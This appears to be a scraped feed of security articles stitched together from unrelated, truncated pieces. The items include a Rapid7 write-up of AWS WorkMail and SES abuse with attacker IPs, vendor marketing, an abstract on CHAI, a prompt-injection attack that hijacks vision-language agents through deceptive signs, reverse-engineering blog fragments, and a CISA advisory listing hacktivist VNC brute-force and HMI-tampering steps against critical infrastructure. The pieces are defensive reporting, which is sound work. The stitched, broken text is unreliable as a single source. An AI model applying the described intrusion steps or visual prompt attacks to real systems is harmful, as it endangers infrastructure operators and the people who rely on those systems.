operations, attackers can still leverage it as an interim capability alongside Amazon SES. By abusing WorkMail’s authenticated mailboxes and relaxed upfront controls, adversaries can begin sending lower volumes of email immediately — well before SES is moved out of the sandbox and higher sending quotas are approved. This staged approach allows attackers to establish sender reputation, validate infrastructure, and maintain operational momentum while bypassing many of the friction points intentionally built into SES.</p><p>To mitigate this class of abuse, organizations should combine preventive guardrails with focused detection. Where AWS WorkMail is not required, its use should be explicitly blocked using AWS Organizations Service Control Policies (SCPs) to prevent organization creation and mailbox provisioning. In environments where WorkMail is needed, IAM policies should enforce strict least-privilege access and treat WorkMail and SES administration as privileged operations subject to monitoring and approval. Finally, organizations should reduce the likelihood of initial access by implementing secure development and operational practices — such as secret scanning in code repositories, regular key rotation, and minimizing long-term access keys — to limit the impact of credential leakage and prevent attackers from converting compromised credentials into scalable email abuse.</p>MITRE ATT&amp;CK techniques<p><strong>Tactic</strong></p><p><strong>Technique</strong></p><p><strong>Details</strong></p><p>Initial Access</p><p>Valid Accounts: Cloud Accounts (T1078.004)</p><p>The attacker authenticated to AWS using exposed long-term access keys validated with sts:GetCallerIdentity</p><p>Persistence</p><p>Create Account: Cloud Account (T1136.003)</p><p>The attacker created multiple IAM users and AWS WorkMail mailbox users to maintain persistent access</p><p>Privilege Escalation</p><p>Account Manipulation: Additional Cloud Roles (T1098.003)</p><p>The attacker attached the AdministratorAccess managed policy to a newly created IAM user</p><p>Discovery</p><p>Cloud Infrastructure Discovery (T1580)</p><p>The attacker enumerated IAM users and assessed Amazon SES configuration and sandbox status via API calls</p><p>Impact</p><p>Resource Hijacking: Cloud Service Hijacking (T1496.004)</p><p>The attacker abused AWS WorkMail and SES to send high-volume phishing and spam emails from the victim account</p>Indicators of compromise (IOCs)<p>139.59.117[.]125</p><p>3.0.205[.]202</p><p>54.151.176[.]0</p><p><strong>Note: </strong>IP addresses <em>3.0.205[.]202</em> and <em>54.151.176[.]0 </em>are Amazon owned IP addresses so care should be taken when applying IP blocks.</p>Rapid7 customers<p>InsightIDR and Managed Detection and Response (MDR) customers have existing detection coverage through Rapid7’s expansive library of detection rules.

    "link": "https://www.rapid7.com/blog/post/em-eol-cisco-kenna-new-measured-path-into-exposure-management",
    "summary": "<p>Cisco’s announcement that it will sunset Cisco Vulnerability Management (Kenna) marks a clear inflection point for many security teams. With <a href=\"https://www.cisco.com/c/en/us/products/collateral/security/vulnerability-management/vm-vi-appsec-eol.html\">end-of-sale and end-of-life timelines</a> now defined, and no replacement offering on the roadmap, Kenna customers face an unavoidable decision window. </p><p>Beyond the practical need to replace a tool, Kenna’s exit raises a bigger question for security leaders: <strong>what should vulnerability management look like moving forward? </strong></p>Not just a tool change<p>For many organizations, Kenna wasn’t “just another scanner”. Before their acquisition by Cisco in 2021, Kenna Security helped pioneer a shift away from chasing raw CVSS scores and toward prioritization based on real-world risk, influencing how many teams approach risk-based vulnerability management. Security teams invested years building workflows, reporting, and executive trust around that model. </p><p>That’s why this moment feels different. Replacing Kenna isn’t about checking a feature box, it’s about protecting the integrity of the progress teams have already made while using this moment to elevate programs past traditional vulnerability management.</p><p>Security leaders are rightly cautious. No one wants to: </p><ul><li><p>Rush into a short-term replacement vs. a platform that suits current and future needs</p></li><li><p>Trade proven prioritization for untested promises </p></li><li><p>Disrupt remediation workflows that engineering teams finally trust </p></li></ul><p>At the same time, few teams believe traditional vulnerability management – isolated scanners, static scoring, endless ticket queues – is sufficient on its own anymore. </p><p>So where does that leave you? </p>“Risk-based vulnerability management is dead” doesn’t tell the full story<p>In response to Kenna’s end-of-life, much of the market has rushed to frame this as the end of risk-based vulnerability management (RBVM) altogether. The message is often loud and binary: <em>RBVM is outdated, jump straight to </em><a href=\"https://www.rapid7.com/fundamentals/what-is-exposure-management/\">exposure management</a>.</p><p>In practice, that framing doesn’t match how security programs actually evolve. </p><p>Most organizations are not abandoning vulnerability management. They are <strong>expanding it:</strong></p><ul><li><p>From on-prem to hybrid and cloud</p></li><li><p>From isolated findings to broader attack surface context </p></li><li><p>From vulnerability lists to exposure-driven decisions </p></li><li><p>From static to continuous</p></li></ul><p>The mistake is assuming this evolution requires a hard reset, or that exposure management is completely separate and not part of that evolution.  </p><p>For CISOs and hands-on leaders alike, the smarter question is: <strong>how do we preserve what works today, while building toward what we know we’ll need tomorrow?</strong></p>What Kenna customers should prioritize next <p>As you evaluate what comes after Kenna, the right decision comes down to which platform can consistently deliver security outcomes and measurable risk reduction: </p>Continuity without disruption<p>Your team already understands risk-based prioritization. The next platform should strengthen that muscle, not force you back to severity-only thinking or one-dimensional scoring models that ignore business context and threat intelligence. </p>See risk clearly across on-prem, cloud, and external environments<p>Risk doesn’t live exclusively on-prem or in the cloud. Vulnerability data needs to reflect the reality of modern environments – endpoints, cloud workloads, external-facing assets – without fragmenting visibility. It needs to build on what teams already have by supporting findings from a broad range of existing tools and services, so risk can be understood in one place instead of scattered across platforms. </p>Customizable remediation workflows<p>Prioritization only matters if it leads to action. Look for platforms that help security and IT teams collaborate, track ownership, and measure progress without creating more friction. </p>A credible path forward<p>Exposure management is valuable only when it’s grounded in accurate data, operational context, and day-to-day usability. Security teams are already drowning in findings across tools, and without context that explains what matters and why, exposure management adds more noise instead of helping teams make decisions and reduce risk. That noise shows up in familiar ways: duplicate findings aren’t reconciled, conflicting risk scores between tools, unclear ownership for remediation, and long lists of issues with no clear path to action.</p>Why this moment favors steady platforms, not big bets<p>Kenna’s exit creates pressure, but pressure shouldn’t drive risky or forced decisions. Security leaders are accountable not just for vision, but for outcomes, such as: </p><ul><li><p>Are we reducing real risk this quarter? </p></li><li><p>Can we explain prioritization decisions to the board? </p></li><li><p>Will this platform still support us two or three years from now? </p></li></ul><p>This is where vendor stability, roadmap clarity, and operational proof start to matter more than bold claims. </p><p>The strongest next steps are coming from <a href=\"https://www.rapid7.com/blog/post/em-rapid7-leader-2025-gartner-exposure-assessment-platform-magic-quadrant-mq-eap/\">platforms that already deliver</a> visibility across hybrid environments, mature, threat-informed vulnerability prioritization, and integrated remediation workflows that teams actually use. From there, exposure management becomes an evolution, not a leap of faith. </p>A measured path forward<p>Kenna’s EOL doesn’t signal the end of risk-based vulnerability management. It signals that security programs are ready to expect more from it. For security leaders this is an opportunity to reaffirm what has worked in your program, close real visibility and workflow gaps, and choose a platform that supports both near-term continuity and long-term growth.</p><p>The goal isn’t to chase the next trend. It’s to make a confident, practical decision – one that protects today’s outcomes while positioning your team for what’s next. </p>Looking ahead<p>If you’re navigating what comes after Cisco Kenna, the most important step is understanding your options early, before timelines force rushed decisions.

    "link": "https://www.rapid7.com/blog/post/it-signals-into-strategy-security-teams-must-prepare-in-2026",
    "summary": "<p>The 2026 Security Predictions webinar reinforced a simple but uncomfortable truth. The forces shaping cyber risk are not new, but they are converging faster and with greater impact than many organizations are ready for. Geopolitics, insider risk, and threat intelligence have long influenced cyber operations. What has changed is the extent to which they directly affect everyday security decisions.</p>Geopolitical risk is now an operational concern<p>Cyber operations have always reflected geopolitical realities. Nation-states have used cyber capabilities for espionage, surveillance, and disruption for decades. Historically, these activities focused on governments, critical infrastructure, or defense sectors.</p><p>That line has faded.</p><p>Today, private organizations are increasingly targeted as proxies. Supply chains, cloud providers, and SaaS platforms offer scale, access, and plausible deniability for state-aligned groups. Many of these campaigns are not designed for immediate disruption. Instead, they focus on intelligence gathering, long-term access, or positioning that can be activated later.</p><p>For security teams, this shift creates a new challenge. Geopolitical motivation does not follow traditional cybercrime logic. Organizations that do not consider themselves high risk can still become collateral targets because of who they work with, where they operate, or what services they provide.</p><p>Geopolitical awareness can no longer sit outside the SOC. It must influence monitoring priorities, threat modeling, and response readiness.</p>Looking ahead: Action plan for 2026<p>Security teams should track geopolitical developments and understand how global events influence attacker behavior. Curated threat intelligence helps translate abstract risk into concrete tools, infrastructure, and techniques that defenders can monitor.</p><p>Incident response playbooks should also account for politically motivated attacks. These scenarios benefit from executive pre-approval, allowing teams to respond decisively when intent is unclear but potential impact is high.</p><p>Finally, organizations should map exposure across suppliers, technology partners, and infrastructure dependencies. Understanding where geopolitical risk intersects with your environment is now essential for resilience.</p>Insider threats are becoming a primary breach driver<p>Insider threats are not a new problem, but their role in breaches continues to grow. Within the 2026 Security Predictions webinar, the panel emphasized that insider risk now spans a wide spectrum. At one end is simple negligence, including phishing mistakes, misconfigurations, and poor access hygiene. At the other is deliberate access monetization, where credentials or privileged access are sold or misused.</p><p>Several factors are accelerating this trend. Workforce stress, economic pressure, role churn, and identity sprawl all increase the likelihood that access will be abused or misused. In many cases, breaches now begin with valid credentials, making traditional perimeter defenses less effective.</p><p>This reality forces a shift in how security teams think about trust and access. Valid access no longer means safe access.</p>Looking ahead: Action plan for 2026<p>Security teams should establish behavior baselines across users and roles to identify anomalous activity early. Unexpected access patterns, unusual downloads, or irregular logins often provide the first signal that something is wrong.</p><p>Just as important is fostering a speak-up culture. Employees should be encouraged to report phishing attempts, mistakes, or suspicious behavior without fear. Early reporting often determines whether an incident is contained quickly or escalates.</p><p>Privilege models also require regular review. Least privilege must be continuous, not static. As roles evolve and environments change, access should be reassessed to reduce blast radius when incidents occur.</p>Context is becoming the decisive advantage<p>Threat intelligence and detection capabilities have advanced rapidly, but volume alone does not improve outcomes. Security teams now face more alerts, more telemetry, and more data than ever before. The challenge is deciding what matters.</p><p>The panel highlighted that speed without context creates noise, not security. As exploitation windows shrink and attacks scale, teams that lack context struggle to prioritize, investigate, and respond effectively.</p><p>Context brings together asset criticality, exposure, threat intelligence, and business impact. Teams that operate with this understanding move faster because they know where to focus and why.</p><p>This shift also changes how security leaders communicate value. Metrics tied to readiness, risk reduction, and response effectiveness resonate far more than raw alert counts.</p>Looking ahead: Action plan for 2026<p>Security leaders should align SecOps and executive stakeholders around shared dashboards and context-rich briefings. These views should emphasize readiness gaps, exposure trends, and investment value, rather than activity volume.</p><p>Organizations should also rationalize security tooling around outcomes. High-impact tools that improve time to detect, time to respond, and analyst efficiency matter more than broad coverage alone.</p><p>Finally, teams should reinvest saved time and budget into areas that compound over time. Automation, threat intelligence, and staff development all strengthen resilience when supported consistently.</p>Preparing for what comes next<p>The webinar made it clear that success in 2026 will depend on integration, awareness, and context. Geopolitical risk, insider threats, and intelligence-driven defense are no longer separate concerns. They intersect daily inside modern security operations.</p><p>Teams that acknowledge this reality and act early will be better positioned to respond with confidence, adapt to change, and stay ahead of increasingly sophisticated attackers.</p><p><strong>Missed the live session?

    "link": "https://www.rapid7.com/blog/post/dr-microsoft-defender-to-tangible-security-outcomes-with-rapid7-mdr",
    "summary": "<p>Organizations increasingly rely on <a href=\"https://www.rapid7.com/blog/post/pt-rapid7-partner-mdr-for-microsoft/\">Microsoft</a> as their foundational productivity and security technology provider. As these environments grow in scale and complexity, security leaders are responsible for operationalizing the vast signals traversing their Microsoft stack in order to anticipate and preempt threats. At the same time, those efforts must deliver measurable security outcomes and clear return on investment.</p><p>If you’re reading this, you already know what’s at stake. But I’ll say it louder for the folks in the back: As more of your environment consolidates onto Microsoft, the attack surface evolves – and without fully operationalizing that ecosystem, risk grows alongside it.</p><p>We are excited to announce the availability of Rapid7 <a href=\"https://www.rapid7.com/services/managed-detection-and-response-mdr/microsoft\" target=\"_blank\">MDR for Microsoft</a> – a preemptive threat detection, investigation, and response service that brings together Rapid7’s global SOC, our market-leading SIEM technology, and deeper bi-directional Microsoft Defender integrations. The service helps security and IT teams maximize their investments, reduce cost and complexity, respond decisively to threats, and improve their security posture and resilience.</p>Extend the power of your stack<p>Microsoft Defender provides broad visibility across modern environments – from endpoint and identity to cloud and email. That visibility leads many organizations to a fine line, where it can either mean <em>rich, actionable insight</em> for some security teams, and <em>overwhelming signal volume and missed alerts </em>for others. Rapid7 helps organizations build a clear picture from the rich telemetry by bringing these Microsoft signals together with our native telemetry. And by incorporating exposure and asset risk directly into investigations, our SOC is empowered to anticipate likely breach paths and intervene earlier in the attack lifecycle. Combining your Microsoft security stack with our preemptive MDR ultimately helps you:</p><ul><li><strong>Anticipate attacks before they start</strong></li><li><strong>Respond with certainty across the full attack lifecycle</strong></li><li><strong>Strengthen resilience through partnership</strong></li><li><p><strong>Get better outcomes from Microsoft - not overhead</strong></p></li></ul>Capabilities that drive real-world outcomes<p>Leaning into Rapid7’s proven record as a leader in managed detection and response, MDR for Microsoft combines powerful AI-SOC technology with expert human service delivery to help Microsoft-centric organizations achieve measurable security outcomes. In <a href=\"https://www.rapid7.com/lp/idc-report-mdr-roi/\">IDC’s recent Business Value of Rapid7 MDR study</a>, customers achieved a 422% three-year ROI, identified threats 87% faster, and reduced the likelihood of a major security event by 54%. MDR for Microsoft delivers these same results through capabilities designed to operationalize and protect Microsoft environments at scale, including:</p><ul><li><p><strong>Risk-aware analysis that stops attacks earlier: </strong>By pairing enterprise vulnerability risk management with analysis of live threat activity, the service preemptively identifies the attack paths most likely to be exploited – empowering efficient analyst evaluation with a clear understanding of underlying asset context.</p></li></ul><ul><li><p><strong>Dedicated cybersecurity advisor extends your team: </strong>Your advisor leverages their practitioner experience to provide regular threat briefings, environment-hardening advice, program governance, and health checks – helping drive long-term maturity without adding headcount.</p></li><li><p><strong>Decisive response backed by deep forensics and unlimited IR:</strong> Remote containment, endpoint forensics powered by our open-source DFIR framework –  Velociraptor – and unlimited incident response ensure threats are stopped quickly, and fully investigated and neutralized before our team rests.</p></li></ul><ul><li><p><strong>Unlimited log ingestion delivers predictable value</strong>: Remove SIEM cost constraints and ensure complete visibility so investigations are never limited by data volume or surprise overage fees.</p></li><li><p><strong>Bi-Directional Defender integration that reduces friction: </strong>Endpoint alerts and analyst actions stay synchronized between Rapid7 and Microsoft consoles, keeping systems aligned while laying the foundation for broader integrations across additional Microsoft security vectors.</p></li><li><p><strong>Always-on, expert-led SOC coverage: </strong>Our 24x7x365 global SOC continuously monitors and investigates activity across Microsoft and non-Microsoft environments, ensuring threats are identified and acted on as soon as they emerge.</p></li><li><p><strong>Full transparency into SOC activity and outcomes: </strong>With direct access to the SIEM and investigation workflows, your team can ride sidecar on investigations, run your own queries, upskill internal teams, and clearly see the outcomes being delivered by the Rapid7 SOC over time.</p></li></ul><p>Additional value-drivers included in the service are unlimited SOAR automation, standard 13-month data retention with the ability to extend, proactive threat hunting, and AI-assisted investigation workflows, delivering a comprehensive MDR experience that scales with your environment and outpaces attackers.</p>Make the most of Microsoft Defender with Rapid7<p>As Microsoft continues to serve as the backbone of modern environments, the ability to translate security signals into consistent action becomes increasingly critical. MDR for Microsoft is designed to help security leaders move confidently from visibility to outcomes – pairing the strength of Microsoft Defender with Rapid7’s proven expertise, preemptive risk-awareness, and resilience-building capabilities. The result is a security program that not only sees more, but responds faster, operates with greater confidence, and proves its value as environments continue to scale.</p><p>If you’d like to see how MDR for Microsoft can help you operationalize your Microsoft security stack, request a demo or reach out to your Rapid7 account team to continue the conversation.</p>",

These capabilities, however, also create new security risks. In this paper, we introduce CHAI (Command Hijacking against embodied AI), a new class of prompt-based attacks that exploit the multimodal language interpretation abilities of Large Visual-Language Models (LVLMs). CHAI embeds deceptive natural language instructions, such as misleading signs, in visual input, systematically searches the token space, builds a dictionary of prompts, and guides an attacker model to generate Visual Attack Prompts. We evaluate CHAI on four LVLM agents; drone emergency landing, autonomous driving, and aerial object tracking, and on a real robotic vehicle. Our experiments show that CHAI consistently outperforms state-of-the-art attacks. By exploiting the semantic and multimodal reasoning strengths of next-generation embodied AI systems, CHAI underscores the urgent need for defenses that extend beyond traditional adversarial robustness...</p>",

Security teams have been automating vulnerability discovery for years, investing heavily in fuzzing infrastructure and custom harnesses to find bugs at scale. But what stood out in early testing is how quickly Opus 4.6 found vulnerabilities out of the box without task-specific tooling, custom scaffolding, or specialized prompting. Even more interesting is how it found them. Fuzzers work by throwing massive amounts of random inputs at code to see what breaks. Opus 4.6 reads and reasons about code the way a human researcher would­—looking at past fixes to find similar bugs that weren’t addressed, spotting patterns that tend to cause problems, or understanding a piece of logic well enough to know exactly what input would break it. When we pointed Opus 4.6 at some of the most well-tested codebases (projects that have had fuzzers running against them for years, ...</p>",

It’s a price that I am willing to pay.</p>\n<p>One of the main obstacles to build the site was that I needed to add/edit information from my desktop and tablet. I am definitely not a cloud fan so using it to sync between devices was out of question (people do it with Evernote, etc). For a while I thought about developing a mobile or web application to achieve this but was too lazy for that.</p>\n<p>Last weekend the right idea popped in my mind (I think I was reading something about the topic). I could use GitHub to store the data that I need to edit between devices, and GitHub actions to automate the build process. GitHub allows unlimited private repositories to free users, and the data to store there isn’t critical. I would always have a local copy and if GitHub bans me the impact is meaningless - they are just an intermediary and both ends are controlled by me.</p>",

My position didn’t change and given that there is an upcoming presentation about this malware by <a href=\"https://objectivebythesea.com/v3/content.html#tReed\">Thomas Reed</a> at Objective By The Sea it’s time to re-release this.</em></p>\n<p>While sorting out my Mac malware collection I found out that I had an unreleased (no known public references) FruitFly/Quimitchin dropper script lost in my archives.</p>\n<p>FruitFly made big headlines two years ago and its author has been <a href=\"https://www.zdnet.com/article/ohio-hacker-indicted-fruitfly-malware-spy-on-thousands-of-mac-users/\">arrested</a>. It was first reported by <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\">MalwareBytes</a> and then a new variant was analysed by <a href=\"https://papers.put.as/papers/macosx/2017/VB2017-Wardle.pdf\">Patrick Wardle</a>. Besides being under the radar for more than a decade, it was kind of exotic malware because most of its code was written in Perl. Last time I did something serious in Perl was twenty years ago or so!</p>",

    "summary": "<p>These days the de facto debugger in macOS is <a href=\"https://lldb.llvm.org\">LLDB</a>. Apple’s old gdb fork doesn’t work anymore and the <a href=\"https://www.gnu.org/software/gdb/\">GNU gdb</a> version is better these days but still quite meh (in the past it couldn’t deal with fat binary targets and I still think this holds true). So we are all essentially stuck with LLDB, warts and all. I also hate the lack of a <a href=\"https://github.com/gdbinit/Gdbinit\">gdbinit</a> style output but Deroko started that project and I improved it with <a href=\"https://github.com/gdbinit/lldbinit\">lldbinit</a>.</p>\n<p>Besides its horrible long command line syntax which is so unpopular that gdb-compatible commands were introduced, my biggest problem with it has been the lack of <strong>x86 hardware breakpoint</strong> support. While hardware breakpoints might not be needed to debug applications within Xcode, they are essential to any serious reverse engineer dealing with arbitrary untrusted targets such as malware, packers, obfuscators, and DRM. It has been a serious blocker for me against some targets and a source of immense frustration because it should be a basic debugger feature.</p>\n<p>Last week I finally got fed up enough to dive into the LLDB C++ codebase and finally try to implement this feature. Instead of just posting a patch, this post is a journey into LLDB internals and how I implemented this feature. Hopefully it will help others exploring the LLDB codebase, which seems unfriendly because of the lack of really good documentation into its architecture. Maybe this could lead to further improvements and make LLDB more reverse engineer friendly.</p>",

I made good reversing progress with static analysis, but dynamic analysis with a debugger would make the job much easier. I love debuggers because they allow you to quickly test ideas and cut corners while reversing a target. Reading disassembly listings for long periods is tiring. (U)EFI debuggers can be found in the market but they are usually quite expensive (a couple thousand USD).</p>\n<p>My solution was to create an emulator and debugger based on <a href=\"https://www.unicorn-engine.org\">Unicorn</a>. At the time I was working a lot with Unicorn so it was natural to use it to solve this problem (“if all you have is a hammer, everything looks like a nail”).

These attacks use minimally secured, internet-facing virtual network computing (VNC) connections to infiltrate (or gain access to) OT control devices within critical infrastructure systems. Pro-Russia hacktivist groups—Cyber Army of Russia Reborn (CARR), Z-Pentest, NoName057(16), Sector16, and affiliated groups—are capitalizing on the widespread prevalence of accessible VNC devices to execute attacks against critical infrastructure entities, resulting in varying degrees of impact, including physical damage.

For additional information on Russian state-sponsored malicious cyber activity, see CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia\" title=\"Russia Threat Overview and Advisories\">Russia Threat Overview and Advisories</a> webpage.</p>\n<p>Download the PDF version of this report:</p>\n\n\n<a href=\"https://www.cisa.gov/sites/default/files/2025-12/aa25-343a-pro-russia-hacktivists-conduct-attacks_0.pdf\" target=\"_blank\">Pro-Russia Hacktivists Conduct Opportunistic Attacks Against US and Global Critical Infrastructure</a>\n(PDF,       1.53 MB\n  )\n\n\n<strong>Background and Development of Pro-Russia Hacktivist Groups</strong>\n<p>Over the past several years, the authoring organizations have observed pro-Russia hacktivist groups conducting cyber operations against numerous organizations and critical infrastructure sectors worldwide. The escalation of the Russia-Ukraine conflict in 2022 significantly increased the number of these pro-Russia groups. Consisting of individuals who support Russia’s agenda but lack direct governmental ties, most of these groups target Ukrainian and allied infrastructure. However, among the increasing number of groups, some appear to have associations with the Russian state through direct or indirect support.</p>\n<strong>Cyber Army of Russia Reborn</strong>\n<p>The authoring organizations assess that the Russian General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455—tracked in the cybersecurity community under several names (see<strong> </strong><a href=\"https://www.cisa.gov/#AppB\" title=\"Appendix B\"><strong>Appendix B: Additional Designators Used for Cited Groups</strong></a>)—is likely responsible for supporting the creation of CARR —also known as “The People’s Cyber Army of Russia”—in late February or early March of 2022. Actors suspected to be from GRU unit 74455 likely funded the tools CARR threat actors used to conduct distributed denial-of-service (DDoS) attacks through at least September 2024.</p>\n<p>In April 2022, the group began using a new Telegram channel featuring the name “CyberArmyofRussia_Reborn” to organize and plan group actions. The channel creators recruited actors to use CARR as an unattributable platform for conducting cyber activities beneath the level of an APT, aimed at deterring anti-Russia rhetoric. CARR threat actors presented themselves as a group of pro-Russia hacktivists supporting Russia’s stance on the Ukrainian conflict, and they soon began claiming responsibility for DDoS attacks against the U.S. and Europe for supporting Ukraine.</p>\n<p>CARR documented these actions through embellished images and videos shared on their social media channels, promoting Russian ideology, disseminating talking points, and publicizing leaked information from hacks attributed to Russian state threat actors.</p>\n<p>In late 2023, CARR expanded their operations to include attacks on industrial control systems (ICS), claiming an intrusion against a European wastewater treatment facility in October 2023. In November 2023, CARR targeted human-machine interface (HMI) devices, claiming intrusions at two U.S. dairy farms.</p>\n<p>The authoring organizations assess that by late September 2024, CARR channel administrators became dissatisfied with the level of support and funding provided by the GRU. This dissatisfaction led CARR administrators and an administrator from another hacktivist group, NoName057(16), to create the Z-Pentest group, employing the same tactics, techniques, and procedures (TTPs) as CARR but separate from GRU involvement.</p>\n<strong>NoName057(16)</strong>\n<p>The authoring organizations assess that the Center for the Study and Network Monitoring of the Youth Environment (CISM), established on behalf of the Kremlin, created NoName057(16) as a covert project within the organization. Senior executives and employees within CISM developed and customized the NoName057(16) proprietary DDoS tool <code>DDoSia</code>, paid for the group’s network infrastructure, served as administrators on NoName057(16) Telegram channels, and selected DDoS targets.</p>\n<p>Active since March 2022, NoName057(16) has conducted frequent DDoS attacks against government and private sector entities in North Atlantic Treaty Organization (NATO) member states and other European countries perceived as hostile to Russian geopolitical interests. The group operates primarily through Telegram channels and used GitHub, alongside various websites and repositories, to host <code>DDoSia</code> and share materials and TTPs with their followers. </p>\n<p>In 2024, NoName057(16) began collaborating closely with other pro-Russia hacktivist groups, operating a joint chat with CARR by mid-2024. In July 2024, NoName057(16) jointly claimed responsibility with CARR for an alleged intrusion against OT assets in the U.S. The high degree of cooperation with CARR likely contributed to the formation of Z-Pentest, which is composed of actors and administrators from both teams, in September 2024.</p>\n<strong>Z-Pentest</strong>\n<p>Established in September 2024, Z-Pentest is composed of members from CARR and NoName057(16). The group specializes in OT intrusion operations targeting globally dispersed critical infrastructure entities. Additionally, the group uses “hack and leak” operations and defacement attacks to draw attention to their pro-Russia messaging. Unlike other pro-Russia hacktivist groups, Z-Pentest largely avoids DDoS activities, claiming OT intrusions as attempts to garner more attention from the media.</p>\n<p>Shortly after Z-Pentest’s inception, the group announced alliances with CARR and NoName057(16), possibly to leverage the other groups’ subscribers to grow the new channel. In March 2025, Z-Pentest posted evidence claiming OT device intrusions to their channel using a NoName057(16) cyberattack campaign hashtag. Similarly, in April 2025, Z-Pentest shared a video purporting defacement of an HMI by changing system names to NoName057(16) and CARR references. Z-Pentest continues to create new alliances with other groups, like Sector16, to continue growing their subscriber base and incidentally propagate TTPs with new partners.</p>\n<strong>Sector16</strong>\n<p>Formed in January 2025, Sector16 is a novice pro-Russia hacktivist group that emerged through collaboration with Z-Pentest. Sector16 actively maintains an online presence, including a public Telegram channel where they share videos, statements, and claims of compromising U.S. energy infrastructure. These communications often align with pro-Russia narratives and reflect their self-proclaimed support for Russian geopolitical objectives.</p>\n<p>Members of Sector16 may have received indirect support from the Russian government in exchange for conducting specific cyber operations that further Russian strategic goals. This aligns with broader Russian cyber strategies that involve leveraging non-state threat actors for certain cyber activities, adding a layer of deniability.</p>\n<strong>Technical Details</strong>\n<p><strong>Note:</strong> This advisory uses the MITRE ATT&amp;CK® <a href=\"https://attack.mitre.org/versions/v18/matrices/enterprise/\" title=\"Matrix for Enterprise framework\">Matrix for Enterprise framework</a>, version 18. See the <a href=\"https://www.cisa.gov/#MITRE\" title=\"MITRE ATT&amp;CK Tactics and Techniques\"><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></a> section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>\n<strong>TTP Overview</strong>\n<p>Pro-Russia hacktivist groups employ easily disseminated and replicated TTPs across various entities, increasing the likelihood of widespread adoption and escalating the frequency of intrusions. These groups have limited capabilities, frequently misunderstanding the processes they aim to disrupt. Their apparent low level of technical knowledge results in haphazard attacks where actors intend to cause physical damage but cannot accurately anticipate actual impact. Despite these limitations, the authoring organizations have observed these groups willfully cause actual harm to vulnerable critical infrastructure.</p>\n<p>Pro-Russia hacktivist groups use the TTPs in this Cybersecurity Advisory to target virtual network computing (VNC)-connected HMI devices. These groups are primarily seeking notoriety with their actions. While they have caused damage in some instances, they regularly make false or exaggerated claims about their attacks on critical infrastructure to garner more attention. They frequently misrepresent their capabilities and the impacts of their actions, portraying minor incursions as significant breaches, but such incursions can still lead to lost time and resources for operators remediating systems.</p>\n<p>Additionally, pro-Russia hacktivists use an opportunistic targeting methodology. They leverage superficial criteria, such as victim availability and existing vulnerabilities, rather than focusing on strategically significant entities. Their lack of strategic focus can lead to a broad array of targets, ranging from water treatment facilities to oil well systems. Pro-Russia hacktivists have demonstrated a pattern of frequently taking advantage of the widespread availability of vulnerable VNC connections. While system owners typically use VNC connections for legitimate remote system access functions, threat actors can maliciously use these connections to broadly target numerous platforms and services. Consequently, these groups can indiscriminately compromise critical infrastructure entities, including those in the <a href=\"https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors/water-and-wastewater-sector\" title=\"Water and Wastewater Sector\">Water and Wastewater</a>, <a href=\"https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors/food-and-agriculture-sector\" title=\"Food and Agriculture Sector\">Food and Agriculture</a>, and <a href=\"https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors/energy-sector\" title=\"Energy Sector\">Energy</a> Sectors.</p>\n<p>Pro-Russia hacktivist groups have successfully targeted supervisory control and data acquisition (SCADA) networks using basic methods, and in some cases, performed simultaneous DDoS attacks against targeted networks to facilitate SCADA intrusions. As recently as April 2025, threat actors used the following unsophisticated TTPs to access networks and conduct SCADA intrusions:</p>\n<ul>\n<li>Scan for vulnerable devices on the internet [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0883/\" target=\"_blank\" title=\"T0883\">T0883</a>] with open VNC ports [<a href=\"https://attack.mitre.org/versions/v18/techniques/T1595/002/\" target=\"_blank\" title=\"T1595.002\">T1595.002</a>].</li>\n<li>Initiate temporary virtual private server (VPS) [<a href=\"https://attack.mitre.org/versions/v18/techniques/T1583/003/\" target=\"_blank\" title=\"T1583.003\">T1583.003</a>] to execute password brute force software.</li>\n<li>Use VNC software to access hosts [<a href=\"https://attack.mitre.org/versions/v18/techniques/T1021/005/\" target=\"_blank\" title=\"T1021.005\">T1021.005</a>].</li>\n<li>Confirm connection to the vulnerable device [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0886/\" target=\"_blank\" title=\"T0886\">T0886</a>].</li>\n<li>Brute force the password, if required [<a href=\"https://attack.mitre.org/versions/v18/techniques/T1110/003/\" target=\"_blank\" title=\"T1110.003\">T1110.003</a>].</li>\n<li>Gain access to HMI devices [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0883/\" target=\"_blank\" title=\"T0883\">T0883</a>], typically with default [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0812/\" target=\"_blank\" title=\"T0812\">T0812</a>], weak, or no passwords [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0859/\" target=\"_blank\" title=\"T0859\">T0859</a>].</li>\n<li>Log the confirmed vulnerable device IP address, port, and password.</li>\n<li>Using the HMI graphical interface [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0823/\" target=\"_blank\" title=\"T0823\">T0823</a>], capture screen recordings or intermittent screenshots while conducting the following actions, intending to affect productivity and cause additional costs [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0828/\" target=\"_blank\" title=\"T0828\">T0828</a>]:\n<ul>\n<li>Modify usernames/passwords [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0892/\" target=\"_blank\" title=\"T0892\">T0892</a>];</li>\n<li>Modify parameters [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0836/\" target=\"_blank\" title=\"T0836\">T0836</a>];</li>\n<li>Modify device name [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0892/\" target=\"_blank\" title=\"T0892\">T0892</a>];</li>\n<li>Modify instrument settings [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0831/\" target=\"_blank\" title=\"T0831\">T0831</a>];</li>\n<li>Disable alarms [<a href=\"https://attack.mitre.org/versions/v18/techniques/T0878/\" target=\"_blank\" title=\"T0878\">T0878</a>];</li>\n<li>Create loss of view (a technique that mandates local hands-on operator intervention) [<a 